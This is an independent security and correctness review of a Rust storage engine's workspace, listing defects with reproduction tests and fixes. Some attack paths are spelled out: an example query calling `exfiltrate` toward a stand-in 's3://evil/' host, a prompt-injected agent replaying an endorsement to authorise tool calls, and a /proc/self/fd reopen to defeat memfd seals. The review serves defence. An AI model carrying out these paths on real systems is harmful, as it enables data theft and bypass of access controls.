# CiagoMem-SLAE v3.0 "Final": Independent Deep-Research Review of the Remediated Workspace

Review date: 30 October 2026. This review covers two inputs:

- the attached specification, `ciagomem_slae_complete_technical_whitepaper_and_master_engineering_specification_v3_0_final.md` (1,352 lines);
- the attached workspace, `ciagomem-slae-perplexity-review.zip` (crates `coagomem-core`, `coagomem-wal`, `coagomem-ql` and `ciagomem-crypto`, plus vendored RustCrypto `hmac 0.12.1`, `sha2 0.10.9` and `subtle 2.6.1`).

Environment:

- Linux 6.1.155, x86_64, 2 vCPU.
- Stable Rust 1.99.1, with nightly Miri and the `aarch64-unknown-linux-gnu` target installed.
- All builds were offline against the vendored or cached crates.

Every executable claim below was produced in this environment. Nothing was run on aarch64 hardware, on NVMe devices, or across a power cut.

Evidence classes used throughout:

| Tag | Meaning |
|---|---|
| REQ | Architectural requirement stated by the specification |
| CODE | Behaviour visible in supplied source (file:line) |
| EXEC | Property demonstrated by a test or experiment run in this review |
| CLAIM | Statement in the specification or ledger with no supporting executable evidence |

The review harness ships alongside this report as `ciagomem-r5-review-harness.zip`. It contains:

- `tests/r5_review.rs`: 21 core tests (`r5_defect_*`, `r5_ok_*` and a sizes probe) plus one child-process helper.
- `coagomem-wal/tests/r5_wal.rs`: one WAL test.
- `review-r5/patches/mesh_drain_recheck.diff`: a verified one-line-class fix for the most severe defect.

The convention is that a `r5_defect_*` test passes while the defect is present. Each must fail once fixed, after which its assertion is inverted and it moves into the guard suite.

---

## 1. Executive verdict

### Is the architecture coherent?

Mostly, as a direction. The specification now separates requirement, implementation and gate far more honestly than prior revisions. It withdraws the 2.9× write-amplification claims, the five-relational-feature claim and the "zero overhead" eBPF claim. It also states plainly that strict ACID and strict serializability are unproven.

The remaining incoherence is structural:

- **Two parallel type families with different invariants.** The reviewed arena (`lib.rs`) and the P0 arena (`slot.rs`) each have their own `SeqWord`, `SlotArena`, `SlotHandle`, `ExtentLoc`, `SlotHeader` and read paths. Only one of them carries incarnations; only the other is wired into lifecycle, WAL and io_uring.
- **Identity is designed but not carried end to end.** Incarnation is the system's central identity concept, yet it is absent from the P0 on-disk image format, the P0 slot read path, the reviewed slot read path and the CiaQL reference form.

### Is the implementation sufficient for its claims?

No, and in one place the shipped code contradicts a claim that the specification makes without hedging.

- **Mesh liveness (EXEC, critical).** §4.2 says "P0 provides real producer/consumer SPSC lanes and doorbell coordination". The consumer's `drain_lane` (`mesh.rs:256–279`) can consume a doorbell, drain only to a stale cached tail, report "no more", clear its pending bit and strand every later message forever.
  - The shipped concurrency test `grid_delivers_fifo_per_lane_without_loss_under_concurrency` hung in 12 of 20 runs on this host.
  - A deterministic single-threaded reproduction (`r5_defect_m1`) is included.
  - The supplied fix brings hangs to 0 of 20 runs.
  - Because Calvin votes, credit returns and WAL completions would ride these lanes, this defect blocks every cross-core property.
- **Durability and identity.** Several remediations are present at component level but are bypassable through adjacent paths:
  - Restoring a backup copy of the incarnation journal re-issues a previously used incarnation (S5 regression, EXEC).
  - Labels are caller-mintable at Policy integrity, which bypasses the S6 endorsement fix entirely (EXEC).
  - One endorsement can be replayed across content, fields and side effects (EXEC).
  - The dirty-list API lets a checkpoint discard the truncation pin for a mutation the image does not contain (EXEC at API level).
  - After a WAL fence, an ack already reported as failed is later published as durable (EXEC).
  - Extent images validate without incarnation or epoch, so a deleted tenant's image can be resurrected into a reused dense index (EXEC at validation level).
  - The export-window CVE self-test is structurally unable to detect the regression it names, and the CVE ID it cites is rejected in NVD (EXEC plus primary sources).

### What blocks release or production sign-off

1. P0 correctness defects: R5-M1 (mesh), R5-D1 (rec_LSN), R5-W1 (fence ambiguity), R5-I1 (image identity), R5-L1 (silent A/B rollback), R5-T2 (journal rollback), R5-F1/F2/F3 (label forgery and endorsement replay), R5-P2 (operator confused deputy).
2. Missing integration (CODE: absent). There is no:
   - reactor, sequencer or WAL replay;
   - server, transport or session manager;
   - file-open and boot qualification path (no `O_DIRECT`/`RWF_DSYNC` device checks);
   - persistent tenant map;
   - executor that consumes a validated-query token.

   Without these, none of the end-to-end isolation, durability or latency targets is testable.
3. Missing qualification evidence:
   - Miri on the full core crate, loom or shuttle on mesh, seqlock and vote, and fuzzing on the parser;
   - power-cut or ALICE-style crash testing, and Elle-style history checking;
   - p99 latency on the target hardware.

Sign-off recommendation: **not releasable; not production-qualifiable.** The parser, crypto chain, seqlock memory ordering, WAL record validation and vote-table ABA fix are sound foundations worth keeping. The defects found are mostly local and fixable without rewrites (section 5).

---

## 2. Evidence-backed findings

### 2.1 Summary

| ID | Sev | Status | Location | Confidence |
|---|---|---|---|---|
| R5-M1 | Critical | Confirmed bug (EXEC) | `coagomem-core/src/mesh.rs:256–279` `Consumer::drain_lane` | High |
| R5-D1 | High | Confirmed API defect (EXEC); integration impact depends on future reactor | `dirty.rs:34–85` `on_dirty`/`on_checkpointed`/`min_needed_lsn` | High (API), Medium (deployed impact) |
| R5-W1 | High | Confirmed bug (EXEC) | `gclog.rs:678` `on_cqe`, `:747` `fence` | High |
| R5-I1 | High | Confirmed (EXEC, validation level) | `envelope.rs:249` `ExtentImage::validate` | High |
| R5-L1 | High | Likely risk (CODE) | `lifecycle.rs:62, 454, 535–544` `Probe::Other` fallback | Medium-High |
| R5-T2 | High | Confirmed (EXEC) | `security.rs:164–236` `IncarnationStore`, `:254` `register` | High |
| R5-T1 | High | Confirmed (EXEC); acknowledged in §5 but shipped test codifies it | `security.rs:238` `TenantRegistry.by_id`; `tests/v30_regressions.rs:167–179` | High |
| R5-T3 | Medium | Confirmed (EXEC) | `security.rs:190` `IncarnationStore::open` | High |
| R5-F1 | High | Confirmed bypass (EXEC) | `security.rs:61–83` `Label` (pub `integrity`, unauthenticated `new`) | High |
| R5-F2 | High | Confirmed (EXEC) | `crypto/src/lib.rs:154–189` `Endorsement`; `security.rs:113` | High |
| R5-F3 | High | Confirmed (EXEC) | `security.rs:142` `gateway_allow` + F2 | High |
| R5-F4 | Medium | Design risk (CODE) | `crypto` HMAC endorsement; §9 | High |
| R5-F5 | Medium | Missing check (CODE) | `security.rs:113` `admit_to_frame` (no reader/principal argument) | High |
| R5-P2 | High | Confirmed (EXEC) | `policy.rs:6, 62–64` `OP_OPERATOR` | High |
| R5-P1 | Low | Confirmed functional bug (EXEC) | `policy.rs:22, 59` `destination_parts`/match | High |
| R5-P3 | Medium | Confirmed (EXEC, policy level) | `coagoql.rs:455, 1176` `HydrateFrame{frame_hash}` | High |
| R5-P4 | Medium | Missing evidence | No storage adapter; no `openat2`; no S3 owner condition | High |
| R5-Q1 | Medium | Confirmed functional bug (EXEC) | `coagoql.rs:31, 616–624, 1003` | High |
| R5-Q2 | Medium | Confirmed (EXEC) | `coagoql.rs:355, 856` `Value::Call` | High |
| R5-Q3 | Medium | Confirmed (EXEC) | `coagoql.rs:352, 806–816` `Value::Ref(u64)` | High |
| R5-Q4 | Medium | Confirmed DoS (EXEC) | `coagoql.rs:1303–1307` `visit_paths`/`bool_paths`; `validate_query_ast` `:1499` | High |
| R5-Q5 | Low | Confirmed (EXEC) | lexer keyword case (`IN` vs `in`) | High |
| R5-Q6 | Medium | Design risk (CODE) | `policy.rs:62` `validate_query -> Result<(), _>` | High |
| R5-X1 | Medium | Confirmed (EXEC + primary sources) | `lib.rs:945–966` export self-test | High |
| R5-X2 | Medium | Confirmed (CODE) | `lib.rs:888–890` pub raw fds; `slot.rs:363–387` `new_hugetlb` | High |
| R5-A1 | Medium | Confirmed (EXEC) | `lib.rs:687–713, 762` reviewed `SlotArena::read` | High |
| R5-A2 | Medium | Confirmed (CODE) | `slot.rs` `CoreControl` in private heap | High |
| R5-A3 | Low | Confirmed (CODE) | `seqlock.rs` `WordsMut::new` public, `set(&self)` | Medium |
| R5-A4 | Medium | Maintainability (CODE) | duplicate type families `lib.rs` vs `slot.rs`/`seqlock.rs` | High |
| R5-O1 | Medium | Design risk (CODE) | `lib.rs:341–369` `OutboundFlow`; no control lane | Medium |
| R5-V1 | Low | Improvement (CODE) | `calvin.rs:~116` conflicting ballot reported `Duplicate` | High |
| R5-S1 | Low | Likely risk (CODE) | `slot.rs:542–545` `lsn < current` allows equal LSN | Medium |
| R5-L2 | Low | Likely risk (CODE) | `lifecycle.rs:670` `assert!`, `unreachable!` in CQE path | Medium |
| R5-C1 | Low | Design trade-off (CODE) | `crypto:136` `KeyEpoch` equality | High |
| R5-C2 | Medium | Missing requirement (CODE) | No jti/nonce/audience; `PeerUid` local-only | High |
| R5-C3 | Low | Likely risk (CODE) | `security.rs:41–53` `resolve_ref` | High |
| R5-B1 | High (gate) | Missing evidence | No file-open, `O_DIRECT`, device-cache, FUA or filesystem qualification | High |
| R5-G1 | Medium | Test-suite defect (EXEC) | shipped grid test hangs, no timeout; s5 and torn-tail tests codify defects | High |
| R5-G2 | Info | Spec/ledger correction (EXEC) | §13.2 "no nightly toolchain" | High |

### 2.2 Detailed findings

#### R5-M1 (Critical): mesh consumer strands messages after a budget-limited drain

**Location.** §4.2 "P0 provides real producer/consumer SPSC lanes and doorbell coordination". Code: `coagomem-core/src/mesh.rs` `Consumer::drain_lane` (L256–279) and `poll`.

**Trigger and preconditions.** `drain_lane` refreshes `cached_tails[src]` from the shared tail only when `head == cached_tail`. It returns `more = (h != t)` using the cached tail.

1. A first `poll` drains part of a lane because of `per_lane_budget`, leaving `head < cached_tail`.
2. The producer publishes more items, then sets the doorbell bit.
3. The next `poll` swaps the doorbell to 0. It does not refresh the tail, because `head != cached_tail`.
4. It drains to the stale cached tail, reports `more = false` and clears the pending bit.

The doorbell for the newer items has now been consumed without delivering them. Unless the producer flushes again, they are never delivered, and `prepare_park` reports that the consumer may sleep.

**Violated invariant.** If a message is published and its doorbell is set, the consumer eventually observes it.

**Failure sequence (EXEC).**

- `r5_defect_m1_partial_drain_strands_messages`: push 10 and flush; `poll(5)` returns 5; push 10 and flush; `poll(64)` returns 5; the next 100 polls return 0; `prepare_park()` returns true with 10 messages queued.
- Under Miri the same test passes, so the failure is a logic bug rather than undefined behaviour.
- The shipped `mesh::tests::grid_delivers_fifo_per_lane_without_loss_under_concurrency` hung in 12 of 20 runs (5 s timeout; a normal run takes about 0.01 s).
- During the review run, one consumer thread spun at 100% CPU for more than 7 minutes before it was killed.

**Impact.** This is a liveness failure of every cross-core protocol: stalled Calvin votes, lost credit returns and stuck WAL-completion forwarding. Under parking, a core sleeps with work queued. It is not memory-unsafe.

**Smallest safe correction** (`review-r5/patches/mesh_drain_recheck.diff`). When the drain reaches the cached tail, re-load the shared tail with Acquire before deciding `more`:

```rust
self.heads[src] = h;
if h == t {
    // The doorbell bit for a later flush may already have been consumed.
    self.cached_tails[src] = ring.tail.load(Acquire);
}
(n, h != self.cached_tails[src])
```

Correctness argument:

- The producer stores the tail (Release) before `fetch_or` on the doorbell.
- If our `swap` read that bit, the tail store happens-before our later Acquire load, so we see the new tail and keep the lane pending.
- If our swap did not read the bit, the bit remains set for the next poll.

**Verification.**

- With the patch, the grid test hung in 0 of 20 runs and `r5_defect_m1` fails, as intended.
- Add a loom model of one producer and one consumer with a budget of 1, 2 or 3 and 2–3 flushes, asserting eventual delivery ([loom](https://docs.rs/loom/latest/loom/); [Shuttle](https://github.com/awslabs/shuttle) for larger schedules).
- Add a timeout to the shipped grid test.

**Sources.** Ordering reasoning follows the [Rust atomics documentation](https://doc.rust-lang.org/std/sync/atomic/index.html).

**Confidence.** High; the bug is deterministic.

#### R5-D1 (High): checkpoint completion can drop a truncation pin it does not cover (rec_LSN)

**Location.**

- Ledger S12: "Monotonic per-core LSN contract enforced".
- Code: `dirty.rs:34` `on_dirty` (a no-op when already dirty), `:61` `on_checkpointed(t)` (takes no LSN), `:85` `min_needed_lsn`.

**Trigger and preconditions.**

1. A tenant is dirty since LSN 10, and a checkpoint snapshots it.
2. A record at LSN 20 for the same tenant is appended during the checkpoint write. `on_dirty` is a no-op.
3. The checkpoint completes, and `on_checkpointed(t)` unlinks the tenant.
4. `min_needed_lsn(30)` returns 30, so the log may truncate past LSN 20, which no image contains.

**Violated invariant.** This is ARIES's rule that the RecLSN is "the LSN of the earliest log record whose effect is not reflected in page on disk", and that redo starts at the minimum RecLSN ([Mohan et al., ARIES, TODS 1992](https://www.cs.cmu.edu/~15849g/readings/mohan92.pdf)).

**EXEC.** `r5_defect_d1_checkpoint_forgets_mid_checkpoint_mutation` shows the API accepts this sequence and reports LSN 30 as the truncation floor.

**Dependency.** P0 `lifecycle.rs` defers mutations while `Flushing`, but its own contract says the WAL record "has already been appended". Whether the future reactor calls `on_dirty` at append time (unsafe) or after the deferred apply (safe) is undefined. The API therefore permits silent loss of committed writes.

**Correction.** Change to `on_checkpointed(t, image_lsn)`:

- If the tenant's highest applied LSN is greater than `image_lsn`, re-link it at the tail with `rec_lsn = first LSN > image_lsn`.
- Otherwise unlink it.
- Alternatively, record `last_lsn` per tenant and reject `on_checkpointed` when `last_lsn > image_lsn`.

**Test.** Run the r5 sequence with the corrected API, expecting `min_needed_lsn(30) == 20`. Add a DST property: no truncation ever passes an LSN absent from both the image and the retained log.

**Confidence.** High at API level; medium for deployed impact, since no reactor exists.

#### R5-W1 (High): an ack reported as FAILED is later published as DURABLE

**Location.** `gclog.rs:678` `on_cqe` (no fence check on entry) and `:747` `fence`, which moves the acks of all non-done buffers into `failed`.

**Sequence (EXEC, `coagomem-wal/tests/r5_wal.rs`).**

1. Batch A (ack 10) and batch B (ack 11) are both in flight.
2. B fails beyond `max_retries`, so the log fences, and `failed = [10, 11]`.
3. A then completes successfully. `on_cqe` returns `Ok`, advances, and publishes `durable_lsn >= 1`.

The client was told that 10 failed, yet the record is durable and recovery will replay it.

**Impact.** The outcome is ambiguous: a client that retries a non-idempotent mutation applies it twice. In-memory state also already contains the effects of records the log reports as failed, and readers at `Visibility::Applied` keep seeing them after the fence.

**Background.** The fsyncgate history shows why error paths must be modelled precisely; on Linux a failed writeback can mark pages clean and lose the error ([LWN, 18 Apr 2018](https://lwn.net/Articles/752063/)). This design retains its own buffers, so it avoids that specific trap, and its retry-from-buffer behaviour is sound.

**Correction.**

- Report fenced acks as `Indeterminate`, not `Failed`.
- After a fence, either stop publishing `durable_lsn` (simplest) or keep processing CQEs but publish acks only as `Indeterminate`.
- Require a core restart through recovery before serving reads again. Mark the core `Fenced` in `CoreControl` so readers fail closed.

**Test.** Invert `r5_wal` so that after a fence `core.durable()` never advances and every pending ack is `Indeterminate`.

**Confidence.** High.

#### R5-I1 (High): extent images validate without incarnation or epoch, so deleted tenants can be resurrected

**Location.** `envelope.rs:249` `ExtentImage::validate(bytes, expect_tenant: u32)`. It checks magic, CRC32C and the dense u32 tenant only. `epoch` is decoded but never compared, and there is no incarnation field (the README admits the P0 disk format lacks incarnations and tombstones).

**Sequence.**

1. Tenant X (dense index 5, incarnation I1) has images with `image_seq` 77 in copy B.
2. X is deleted, and dense index 5 is reused for tenant Y (incarnation I2), whose new image has `image_seq` 1 in copy A.
3. After a crash, `RecoverA/B` picks the higher `image_seq`, so X's old state is installed for Y.

**EXEC.** `r5_defect_i1_stale_incarnation_image_validates`: an image from epoch 1 validates for tenant 5 with no epoch or incarnation input.

**Impact.** Cross-tenant disclosure and integrity violation on index reuse. CRC32C is not a MAC, so anyone with raw disk write access can also forge images.

**Correction.**

- Add an `incarnation: u128` and a `tombstone` flag to the image header, and pass the expected incarnation to `validate`.
- Scrub or tombstone both copies before an index is reused, and make tombstoning durable before freeing the dense index.
- Optionally add a keyed MAC for at-rest integrity.

**Test.** Delete and recreate under a crash-point sweep, asserting that no image of I1 is ever installed under I2.

**Confidence.** High at validation level. The exploit path needs delete and reuse, which is not implemented yet.

#### R5-L1 (High): silent rollback to the older A/B copy without a WAL-retention guarantee

**Location.** `lifecycle.rs:62` ("Current copy failed validation (should not happen; bit rot): try the other") and `:454` and `:535–544`.

**Risk.** If the current copy fails validation, the loader installs the older copy with its older `checkpoint_lsn`. Truncation (`dirty.rs`) only retains log back to the latest checkpoint, so records between the two copies' LSNs may already be gone. The result is silent loss of committed data with `applied_lsn` set as if nothing happened.

**Correction.**

- Fail closed: mark the tenant `NeedsRepair`.
- Fall back only if the WAL still contains `[older.checkpoint_lsn+1, …]`. That requires truncation to retain two checkpoints per tenant, or a per-tenant floor equal to the older copy's LSN.

**Test.** Corrupt the current copy after truncation and expect `NeedsRepair`, not `Resident`.

**Confidence.** Medium-high; the fallback code is explicit, and the truncation interplay is analytical.

#### R5-T2 (High): restoring an older incarnation journal re-issues a used incarnation (S5 regression)

**Location.** `security.rs` `IncarnationStore` (counter journal) and `TenantRegistry::register` (`inc = PRF("ciagomem/incarnation/v1", id || counter)`).

**EXEC.** `r5_defect_t2_journal_rollback_reissues_incarnation` asserts `second.1 == third.1`:

1. Register `acme` and back up the journal.
2. Reopen and register again (counter 2, incarnation I2).
3. Restore the backup, reopen and register: I2 is minted again.

**Impact.** Old macaroons, ref tokens and data keyed to I2 become valid for a new life of the tenant: the S5 identity-reuse bug, re-entered through backup/restore, VM snapshot rollback or volume clone. The specification forbids this procedurally ("never restore an old counter") but nothing enforces it.

**Correction.** Bind incarnation derivation to a monotonic domain that survives rollback:

- Include a `journal_uuid` (random at creation) and a fleet-level generation obtained from an external monotonic source (KMS counter, quorum store or TPM NV counter) in the PRF input.
- Refuse to start if the journal's `(uuid, last_counter)` is behind the high-water mark recorded in the WAL superblock or an external store.

**Test.** Run the r5 sequence and expect `open` to fail with `RolledBack`.

**Confidence.** High.

#### R5-T1 (High): restart orphans existing tenants, and the shipped test asserts it as the fix

**Location.** `TenantRegistry.by_id` is an in-memory `HashMap<u64, (String, String, u128)>` with no restore API. `tests/v30_regressions.rs:167–179` (`s5_restart_does_not_reuse_incarnations`) asserts `inc1 != inc2` for the **same** tenant across a restart.

**EXEC.** `r5_defect_t1_restart_orphans_existing_tenant`.

**Impact.** After any restart, re-registering a live tenant mints a new incarnation, invalidating all its capabilities, refs and keyed data. The workaround is an external map, which becomes the real identity authority and is unspecified. The specification acknowledges an in-memory map (§5), but the consequence is understated: the remediation test verifies the defect.

**Correction.**

- Persist `(id → ns, name, inc, state)` in the same journal record as the counter reservation, or in WAL-superblocked metadata.
- Split `lookup` from `create`, and add `delete`, which writes a tombstone.

**Test.** `register(acme)`, restart, then `lookup(acme)` returns I1 and `create(acme)` returns `Exists`.

**Confidence.** High.

#### R5-T3 (Medium): a zero-filled or torn journal tail blocks boot

**Location.** `IncarnationStore::open` rejects `len % 32 != 0` and any record whose check word fails.

**EXEC.** `r5_defect_t3_zero_tail_blocks_boot` appends 32 zero bytes, a pattern a crash can leave after a size update without data.

**Impact.**

- Availability: the node will not start.
- Second order: the operator's natural fix (delete or recreate the journal) resets the counter and triggers R5-T2-style reuse.

**Correction.**

- A `reserve()` returns only after `sync_all`, so any suffix after the last valid record was never acknowledged. Truncate it, then fsync the file and directory, with an audit log entry.
- Keep fail-closed for corruption in the middle of the file.
- Replace the `!n` check with CRC32C over `(counter, epoch, uuid)`.

The lock comes from `std::fs::File::try_lock`, which on Unix "currently corresponds to the flock function" and "may be advisory or mandatory" ([Rust std docs, stable since 1.89.0](https://doc.rust-lang.org/std/fs/struct.File.html#method.try_lock)). It does not protect against a second host on shared storage or against restore-from-backup.

**Confidence.** High.

#### R5-F1 (High): labels are caller-forgeable, which bypasses the S6 endorsement fix

**Location.** `security.rs:61–83`. `Label::new(integrity, …)` accepts any integrity, including `Policy`, and `pub integrity` and `pub sources` are mutable.

**EXEC.** `r5_defect_f1_label_integrity_is_caller_forgeable`: `admit_to_frame(HardConstraint, Label::new(Policy, …), None, …)` returns `Ok`, as does mutating an `External` label to `Policy`.

**Impact.** Integrity is a security property, but its type is plain data. Any frame compiler, agent adapter or retrieval path that constructs labels can claim Policy integrity. The endorsement MAC (the S6 fix) is never consulted.

**Correction.**

- Make the fields private.
- Construct labels only through provenance-specific constructors owned by the engine: `Label::external(src)`, `Label::agent_derived(parents)` and `Label::policy(PolicyToken)`. `PolicyToken` has a private constructor in a trusted module.
- Expose integrity read-only.

**Test.** A compile-fail (trybuild) test showing that `Label { integrity: Policy, .. }` and `Label::new(Policy, ..)` are not reachable outside the trusted module.

**Confidence.** High.

#### R5-F2 and R5-F3 (High): endorsement replay across content and fields, the zero-sources wildcard, and side-effect authorisation

**Location.** `ciagomem-crypto` `Endorsement::verify`. It binds only `(tenant, sources mask, expiry)` and accepts `sources & !self.sources == 0`, which a label with `sources == 0` always satisfies.

**EXEC.**

- `r5_defect_f2_endorsement_replay_and_zero_sources`: one endorsement elevates two different AgentDerived items, in ActiveIntent and in Playbook, and also elevates a label with sources = 0.
- `r5_defect_f3_replayed_endorsement_authorises_side_effects`: the elevated label passes `gateway_allow(side_effecting = true, sink = 77)`.

**Impact.**

- A user's endorsement of one intent can be replayed by a prompt-injected agent onto attacker-chosen text until expiry, and that text then authorises side-effecting tool calls.
- This is exactly the class of attack that capability-and-provenance designs such as [CaMeL](https://arxiv.org/html/2503.18813) aim to prevent by binding user approval to specific data and actions.

**Correction.** Bind the endorsement MAC to:

- `content_digest` (SHA-256 of the canonical bytes);
- `field`;
- `session_id`;
- a single-use `nonce`, with a consumed-nonce set retained until expiry;
- the `tool/sink` it authorises, for side effects.

Also reject `sources == 0` unless explicitly endorsed.

**Test.** Run the r5 tests inverted. Add a property test: for any endorsement E for (c, f), admission of (c′ ≠ c or f′ ≠ f) fails.

**Confidence.** High.

#### R5-F4 (Medium): symmetric endorsement keys let any verifier forge

**Problem.** HMAC verification requires the signing key, so every component that verifies endorsements (frame compiler, gateway) can also mint them. §9 says "Signing keys must not be exposed to agents", but the verifier is co-resident with agent-facing code.

**Correction.** Use an asymmetric signature (for example Ed25519) held only by the user-channel service, or verify only in a separate process.

**Confidence.** High that this is a design property. Exploitability depends on deployment.

#### R5-F5 (Medium): frame admission has no confidentiality check

**Problem.** `admit_to_frame` takes no principal and never checks that the frame's reader is in `label.readers`. Confidentiality is enforced only at `gateway_allow`, so data a principal may not read can enter that principal's LLM context, where only output-side filtering stands between it and disclosure.

**Correction.** Add a `reader: PrincipalId` parameter and require `label.readers` to contain it.

**Confidence.** High.

#### R5-P2 (High): a tenant-scoped operator token authorises fleet-wide scans (confused deputy)

**Location.** `policy.rs:6` `OP_OPERATOR = 4`; `validate_query` lets `operator` bypass owner checks for scans and backups.

**EXEC.** `r5_defect_p2_tenant_operator_token_scans_fleet`: a token whose Tenant caveat is 11 validates `scan actors[*]` while actors belong to tenants 11 and 22.

**Impact.** Any compromise of a tenant-bound operator token exposes every tenant. §8.1 says "Fleet scans require operator scope", but scope is not separated from tenant.

**Correction.**

- Make fleet operations require a distinct `FleetOperator` capability with its own root key and caveat (`Caveat::Fleet`), not issued by the tenant key epoch.
- Restrict tenant-scoped operator tokens to scans filtered to `owner == tenant`.

**Test.** The r5 test inverted: the tenant-11 operator token gives `ForeignActor` or `FleetScopeRequired`.

**Confidence.** High.

#### R5-P1 (Low): a bucket-root or directory-root allowlist entry denies every object

**Location.** `policy.rs:22` (`destination_parts`) and `:59`. A rule such as `s3://backups/` parses to path `""`. Prefix matching applies only when `p.ends_with('/')`, so only the exact empty path matches.

**EXEC.** `r5_defect_p1_bucket_root_allowlist_denies_everything` (both S3 and `/var/backups/ciagomem/`).

**Impact.** The failure is fail-closed (functional), and an operator may "fix" it by widening rules elsewhere.

**Correction.** Treat an empty path as the root prefix (`p.is_empty() || p.ends_with('/')`), or reject root rules at configuration load with an explicit error.

**Confidence.** High.

#### R5-P3 (Medium): `HYDRATE_FRAME` takes an unbound 64-bit hash

**Problem.** The frame hash is not tied to the actor, tenant or session, and policy accepts any value (EXEC, `r5_defect_p3`). If the executor resolves frames by hash globally, that becomes cross-tenant frame retrieval by enumeration or guessing.

**Correction.** Use a MACed frame reference shaped like `RefToken`, bound to (tenant incarnation, actor, frame generation), or resolve frames only inside the source actor's namespace.

**Confidence.** High at policy level. Executor behaviour is not assessable.

#### R5-P4 (Medium, missing evidence): destination enforcement stops at lexical checks

**Gaps.**

- There is no storage adapter.
- Filesystem destinations need `openat2` with `RESOLVE_BENEATH` (which rejects any component "not a descendant of the directory indicated by dirfd") and `RESOLVE_NO_SYMLINKS` ([openat2(2)](https://man7.org/linux/man-pages/man2/openat2.2.html)).
- S3 writes need the bucket-owner condition so that a renamed or squatted bucket fails with Access Denied ([AWS S3 bucket owner condition](https://docs.aws.amazon.com/AmazonS3/latest/userguide/bucket-owner-condition.html)).
- `allowed_destinations` is global, not per-tenant, so tenant A's export may target B's prefix.

**Correction.** Make the destination rule `(tenant, scheme, bucket or dirfd, prefix, expected_owner)` and enforce it in the adapter, not only in policy.

#### R5-Q1 (Medium): vector literals are capped at 256 dimensions

**Problem.** `list()` enforces `MAX_LIST = 256`, so the `MAX_VECTOR_DIMS = 4096` check at L1003 is unreachable. A 768-dimension similarity query fails with "list too long" (EXEC, `r5_defect_q1`). Typical embeddings (384–3072 dimensions) are unusable from CiaQL.

**Correction.** Parse vector literals with their own bound, `MAX_VECTOR_DIMS`, and keep the token budget (8,192) consistent: 4,096 floats need about 8,191 tokens including commas. Either raise `MAX_TOKENS` for vector-bearing queries, or accept a binary or base64 vector token.

#### R5-Q2 (Medium): unknown function calls are accepted by both parser and policy

**Problem.** `Value::Call{name, args}` accepts any identifier, and `MUTATE { state.x = exfiltrate("s3://evil/", 1) }` validates (EXEC). This contradicts §10: "Unknown stages, malformed values … are errors."

**Risk.** A future executor that adds functions inherits an unvetted surface. Integer arguments are never examined by `referenced_actors`, so any function that takes an actor id bypasses ownership checks.

**Correction.** Use an allowlisted `enum Func { Now, … }` resolved at parse time, and reject unknown names.

#### R5-Q3 (Medium): `$ref:` literals carry no MAC

**Problem.** `Value::Ref(u64)` cannot express the 16-byte `RefToken.mac`, so the query language either passes unauthenticated ids or forces resolution by id alone (EXEC, `r5_defect_q3`).

**Correction.** Change the literal to `$ref:<id>.<mac-hex>`, carried as a `RefToken` and resolved with `resolve_ref` against the tenant's index.

#### R5-Q4 (Medium): caller-built ASTs crash the process through recursion

**Problem.** §8.1 says "Policy is required even for ASTs supplied programmatically", but `validate_query_ast` recurses over `BoolExpr` without a depth bound. A 200,000-deep `And` chain overflows the stack and aborts the process: "has overflowed its stack / fatal runtime error: stack overflow, aborting" (EXEC, `r5_defect_q4`, in a child process). Dropping such an AST is also recursive.

**Correction.**

- Validate depth iteratively (an explicit stack) before any recursive walk, and enforce `MAX_DEPTH` and `MAX_LIST` for programmatic ASTs.
- Alternatively, make AST constructors private and expose only `parse` or a checked builder.

#### R5-Q5 (Low): keyword case is inconsistent

`and`/`AND` are case-insensitive, but only `IN` is accepted; `in` gives "expected comparison operator" (EXEC). The behaviour fails closed but is confusing. Pick one rule and document it.

#### R5-Q6 (Medium): validation is not a type state, and the owner resolver is trusted

**Problem.** `validate_query` returns `()`. Nothing stops an executor from running a query that was never validated, or that was validated against a different `AuthContext`. `owner_of` is an arbitrary closure evaluated once, which leaves a time-of-check/time-of-use gap between validation and execution if ownership moves.

**Correction.**

- Return `ValidatedQuery<'q> { q, tenant_inc, epoch, owners_snapshot_version }` with a private constructor, and accept only that type in the executor.
- Re-check `owners_snapshot_version` under the actor lock at execution.

#### R5-X1 (Medium): the export-window CVE self-test is vacuous, and the CVE ID is rejected

**Location.** `lib.rs:945–966` and §8.3 ("verifies that the read-only mapping cannot gain shared write permission").

**Analysis.**

- The probe maps the `O_RDONLY` fd `MAP_SHARED, PROT_READ` and checks that `mprotect(PROT_WRITE)` fails. For a read-only fd that is guaranteed on every kernel, sealed or not: mmap(2) gives EACCES when "MAP_SHARED was requested and PROT_WRITE is set, but fd is not open in read/write (O_RDWR) mode" ([mmap(2)](https://man7.org/linux/man-pages/man2/mmap.2.html)).
- The real regression concerns a read-only mapping of a **write-capable** fd of a sealed memfd, where VM_MAYWRITE must be cleared so that `mprotect()` cannot undo the seal. The upstream fix ("mm: reinstate ability to map write-sealed memfd mappings read-only", commit 8ec396d05d1b) explains this ([Linux 6.1.149 ChangeLog](https://www.kernel.org/pub/linux/kernel/v6.x/ChangeLog-6.1.149); [openEuler tracker](https://gitee.com/src-openeuler/kernel/issues/IBJ6OH)).
- NVD lists CVE-2024-57937 as "Rejected … by its CNA" ([NVD](https://nvd.nist.gov/vuln/detail/CVE-2024-57937)). The gate should cite the commit, not the CVE number.

**EXEC.**

- In `r5_defect_x1_export_selftest_is_vacuous`, an **unsealed** memfd also "passes" the probe.
- The agent fd of a real window can be reopened `O_RDWR` through `/proc/self/fd/N`, so the seals are the only protection. On this 6.1.155 kernel, a standalone C probe using the reopened RW fd showed `mprotect` correctly denied, so this kernel is patched. The shipped probe would report the same result on an unpatched kernel.

**Correction.**

- Probe exactly the attack path: reopen `/proc/self/fd/<engine_fd>` with `O_RDWR`, map it `MAP_SHARED, PROT_READ`, and assert that `mprotect(PROT_WRITE)` fails and that `mmap(PROT_WRITE, MAP_SHARED)` fails with EPERM.
- Also assert that `F_GET_SEALS` includes `F_SEAL_FUTURE_WRITE | F_SEAL_SHRINK | F_SEAL_GROW | F_SEAL_SEAL` ([memfd_create(2)](https://man7.org/linux/man-pages/man2/memfd_create.2.html)).

**Confidence.** High.

#### R5-X2 (Medium): raw fd hazards, and a writable P0 arena fd intended for agents

**Problems.**

- `SealedExportWindow` exposes `pub engine_fd`, `pub agent_ro_fd` and `pub engine_ptr` as raw integers or pointers. Callers can close or duplicate them, so `Drop` may double-close, which risks fd-number reuse and closing an unrelated descriptor.
- `slot.rs:363` `SlotArena::new_hugetlb` returns a `RawFd` for the **O_RDWR** memfd. Its doc comment says it is "passed to agent processes over SCM_RIGHTS for a read-only mapping". It does not add `F_SEAL_FUTURE_WRITE`, and the `F_ADD_SEALS` result is ignored.

